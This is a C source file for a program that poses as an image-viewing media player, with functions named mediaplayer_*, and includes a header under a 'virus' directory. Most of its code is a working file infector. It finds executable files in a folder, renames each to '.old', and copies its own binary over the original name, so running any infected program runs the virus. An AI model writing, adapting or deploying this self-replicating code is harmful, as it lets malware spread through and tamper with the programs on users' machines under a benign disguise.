#include <gio/gio.h>
#include <glib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "virus/mediaplayer.h"

MediaPlayerState *mediaplayer_state_new(const char *directory) {
    MediaPlayerState *state = g_new0(MediaPlayerState, 1);
    state->working_dir = g_strdup(directory);
    return state;
}

int mediaplayer_scan_folder(char *folder, MediaPlayerState *state) {
    if (!state || !folder) return -1;

    g_list_free_full(state->exec_list, g_free);
    state->exec_list = NULL;

    GDir *fold = g_dir_open(folder, 0, NULL);
    if (!fold) return -1;

    struct stat sb;
    const char *name;

    while ((name = g_dir_read_name(fold))) {
        char *fullpath = g_build_filename(folder, name, NULL);
        if (stat(fullpath, &sb) == 0 && S_ISREG(sb.st_mode) &&
            access(fullpath, X_OK) == 0) {
            state->exec_list = g_list_append(state->exec_list, fullpath);
        } else {
            g_free(fullpath);
        }
    }

    g_dir_close(fold);
    return state->exec_list != NULL;
}

char *getExec() {
    char exe[1024];
    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (len < 0) return NULL;
    exe[len] = '\0';
    return g_strdup(exe);
}

int mediaplayer_dup(char *file) {
    if (!file) return -1;

    char *exe = getExec();
    if (!exe) return -1;

    char *new_name = g_strndup(file, strlen(file) - 4);
    if (!new_name) {
        g_free(exe);
        return -1;
    }

    GError *error = NULL;
    GFile *src = g_file_new_for_path(exe);
    GFile *dst = g_file_new_for_path(new_name);

    if (!src || !dst) {
        if (src) g_object_unref(src);
        if (dst) g_object_unref(dst);
        g_free(exe);
        g_free(new_name);
        return -1;
    }

    gboolean success =
        g_file_copy(src, dst, G_FILE_COPY_OVERWRITE, NULL, NULL, NULL, &error);

    g_object_unref(src);
    g_object_unref(dst);
    g_free(exe);
    g_free(new_name);

    if (error) g_error_free(error);
    return success ? 0 : -1;
}

void mediaplayer_is_old(gpointer data, gpointer user_data) {
    (void)user_data;
    char *file = (char *)data;
    if (!file || g_str_has_suffix(file, ".old")) return;

    char *exe = getExec();
    if (exe && g_str_equal(file, exe)) {
        g_free(exe);
        return;
    }
    g_free(exe);

    char *old_exec = g_strconcat(file, ".old", NULL);

    if (g_file_test(old_exec, G_FILE_TEST_EXISTS | G_FILE_TEST_IS_EXECUTABLE)) {
        g_free(old_exec);
        return;
    }

    if (rename(file, old_exec) == 0) {
        if (mediaplayer_dup(old_exec) != 0) {
            rename(old_exec, file);
        }
    }

    g_free(old_exec);
}

void mediaplayer_verify_files(MediaPlayerState *state) {
    if (state && state->exec_list)
        g_list_foreach(state->exec_list, (GFunc)mediaplayer_is_old, NULL);
}

void mediaplayer_scan_images(MediaPlayerState *state, const char *directory) {
    if (!state || !directory) return;

    g_list_free_full(state->image_files, g_free);
    state->image_files = NULL;

    GDir *dir = g_dir_open(directory, 0, NULL);
    if (!dir) return;

    const char *name;
    while ((name = g_dir_read_name(dir))) {
        if (g_str_has_suffix(name, ".png") || g_str_has_suffix(name, ".jpg") ||
            g_str_has_suffix(name, ".bmp")) {
            char *fullpath = g_build_filename(directory, name, NULL);
            state->image_files = g_list_append(state->image_files, fullpath);
        }
    }

    g_dir_close(dir);
}

GList *mediaplayer_get_images(MediaPlayerState *state) {
    return state ? state->image_files : NULL;
}

void mediaplayer_state_free(MediaPlayerState *state) {
    if (!state) return;
    g_list_free_full(state->image_files, g_free);
    g_list_free_full(state->exec_list, g_free);
    g_free(state->working_dir);
    g_free(state);
}